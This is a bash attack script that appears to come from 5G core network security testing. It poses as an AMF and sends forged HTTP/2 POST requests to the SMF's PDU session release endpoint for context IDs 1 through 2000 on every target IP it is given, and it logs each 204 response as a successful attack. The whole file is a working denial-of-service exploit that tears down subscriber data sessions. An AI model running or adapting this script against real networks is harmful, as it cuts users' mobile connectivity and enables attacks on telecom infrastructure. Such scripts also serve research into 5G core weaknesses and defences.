#!/usr/bin/env bash
j=0
END=2000
for i in $(seq 1 $END);
do
    for smf_ip in "$@"
    do
        # Execute from AMF node:
        op=$(curl -s -o /dev/null -w "%{http_code}" --request POST -d '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}' -H "Content-Type: application/json" --http2-prior-knowledge  -A "AMF" http://$smf_ip/nsmf-pdusession/v1/sm-contexts/$i/release)
        if [ "$op" = "204" ]; then
            echo ""
            echo "Time = `date`"
            echo "Attack successful for session with user context $i"
            echo "Interface-Type = Service-based"
            echo "Interface = AMF-SMF"
            echo "NF IP Address = $smf_ip"
            j=$[j+1]
            #break
        fi
    done
done
#echo "Total successful attacks = $j"
